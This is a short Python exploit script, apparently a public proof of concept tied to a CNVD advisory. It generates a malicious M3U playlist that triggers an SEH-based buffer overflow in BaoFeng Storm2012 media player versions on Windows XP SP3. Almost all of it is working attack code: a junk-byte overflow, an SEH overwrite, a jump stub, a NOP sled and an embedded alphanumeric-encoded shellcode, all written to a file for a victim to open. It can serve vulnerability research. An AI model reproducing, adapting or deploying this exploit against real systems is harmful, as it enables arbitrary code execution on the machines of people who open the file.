#!/usr/bin/env python

#################################################################
#
# Title: BaoFeng Storm M3U File Processing Buffer Overflow Exploit
# CNVD-ID: CNVD-2010-00752
# Author: Lufeng Li and Qingshan Li of Neusoft Corporation
# Download: www.baofeng.com
# Test: Put m3u file in root(e.g. c:/ d:/),and open this m3u file
# Platform: Windows XPSP3 Chinese Simplified
# Vulnerable: Storm2012 3.10.4.21
# Storm2012 3.10.4.16
# Storm2012 3.10.4.8
# Storm2012 3.10.3.17
# Storm2012 3.10.2.5
# Storm2012 3.10.1.12
#################################################################
# Code :
file= "baofeng.m3u"
junk ="\x41"*795
nseh="\x61\xe8\xe1"
seh="\xaa\xd7\x40"

jmp ="\x53\x53\x6d\x58\x6d\x05\x11\x22\x6d\x2d\x10\x22\x6d\xac\xe4"
nops ="\x42" * 110
shellcode=("PPYAIAIAIAIAQATAXAZAPA3QADAZA"
"BARALAYAIAQAIAQAPA5AAAPAZ1AI1AIAIAJ11AIAIAXA"
"58AAPAZABABQI1AIQIAIQI1111AIAJQI1AYAZBABABAB"
"AB30APB944JBKLK8U9M0M0KPS0U99UNQ8RS44KPR004K"
"22LLDKR2MD4KCBMXLOGG0JO6NQKOP1WPVLOLQQCLM2NL"
"MPGQ8OLMM197K2ZP22B7TK0RLPTK12OLM1Z04KOPBX55"
"Y0D4OZKQXP0P4KOXMHTKR8MPKQJ3ISOL19TKNTTKM18V"
"NQKONQ90FLGQ8OLMKQY7NXK0T5L4M33MKHOKSMND45JB"
"R84K0XMTKQHSBFTKLL0KTK28MLM18S4KKT4KKQXPSYOT"
"NDMTQKQK311IQJPQKOYPQHQOPZTKLRZKSVQM2JKQTMSU"
"89KPKPKP0PQX014K2O4GKOHU7KIPMMNJLJQXEVDU7MEM"
"KOHUOLKVCLLJSPKKIPT5LEGKQ7N33BRO1ZKP23KOYERC"
"QQ2LRCM0LJA")

fobj=open(file,"w")
payload=junk+nseh+seh+jmp+nops+shellcode
fobj.write(payload)
fobj.close()